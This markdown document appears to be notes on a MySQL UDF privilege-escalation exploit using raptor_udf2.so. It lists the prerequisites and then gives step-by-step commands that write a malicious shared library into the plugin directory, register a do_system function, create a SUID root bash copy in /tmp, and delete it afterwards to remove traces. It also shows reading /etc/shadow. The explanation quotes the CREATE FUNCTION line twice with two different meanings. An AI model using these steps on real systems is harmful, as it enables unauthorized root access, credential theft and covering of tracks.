## Requirements for MySql UDF exploit and how to verify each requirement
1. Current user must be able to connect to MySql
    - Check this by running: `mysql -u <username> -p`
    - If this connects, stay in MySql and verify further requirements

2. The MySql user must have `FILE` privileges to be able to read from or write to files on the
   server, using SQL statements
    - Verify by running: `SHOW GRANTS FOR <username>;`
    - Look for: `GRANT FILE ON *.* TO 'username@host'`

3. The MySql user must have `CREATE FUNCTION` privileges to register new functions — either 
   stored functions or UDFs — into the database
    - In the same output, look for: `GRANT CREATE FUNCTION ON *.* TO 'your_user'@'host'`

4. The OS-level user must have write access to the plugin directory so a .so file can be saved 
   there and loaded as a UDF
    - Verify by first running: `SHOW VARIABLES LIKE 'plugin_dir';`
    - Copy the output path, something like `/usr/lib/mysql/plugin/`
    - Exit MySql and run: `ls -ld <copied path>`
    - Look for write permissions for that path. Something like: `drwxr-xr-x`
    - Verify which user is running MySql: `ps aux | grep mysqld`
    - The first column of the output will show the user running MySql (os-level user)
    - Test if writing is possible with: `sudo -u <os-user> touch /usr/lib/mysql/plugin/test.txt`

5. For this exploit in particular you must be able to run MySql as sudo
    - Run: `sudo -l` and look for MySql in the list of programs

6. Final requirement is that you're able to transfer malicious raptor_udf2.so file onto the
   victim machine, using wget, scp or another method (research may be needed)

## Exploitation steps

Once you've verified all requirements for MySql UDF exploit you can begin exploitation

- Start root MySql server
    sudo mysql -u root

- Switch to internal MySql database to be able to run functions
    use MySql;

- Create temporary table to hold binary data
    CREATE TABLE foo (line blob);

- Load compiled .so file into table and convert to sql readable format
    INSERT INTO foo VALUES (load_file('/home/user/raptor_udf2.so'));

- Dump sql readable format to MySql plugin directory
    SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';

- Register the malicious `do_system` function with MySql for command injection
    CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';

- Copy bash environment to globally accessible directory to be executed and run as root bash 
  environment
    SELECT do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

- Exit MySql server
    exit;

- Run rootbash environment (root shell) with persisted permissions
    /tmp/rootbash -p

- Remove footprint before exiting root shell
    rm /tmp/rootbash

## Exploit explanation

A temporary table is created in MySQL to hold binary data, enabling the transfer of a malicious 
shared object (.so) file into the server — without requiring direct filesystem access or manual 
placement in the MySQL plugin directory, which is typically restricted.

The .so file contains a compiled version of a C script that defines a function capable of 
executing system-level commands. By using SQL statements, the binary contents of this file are 
read into the database and then added to the MySQL plugin directory using:
    `CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';`

Once the file is in place, the following SQL statement registers the function, prepping it to be 
used with your MySql environment:
    `CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';`

This command links the SQL function name `do_system` to the actual `do_system()` function inside 
the shared library. From that point on, do_system() can be called from within MySQL and used to 
execute arbitrary system commands by passing them as arguments:
    `SELECT do_system('cat /etc/shadow');`

Using this can allow for things like reading `/etc/shadow` files or anything else to gain control 
of the victim machine.
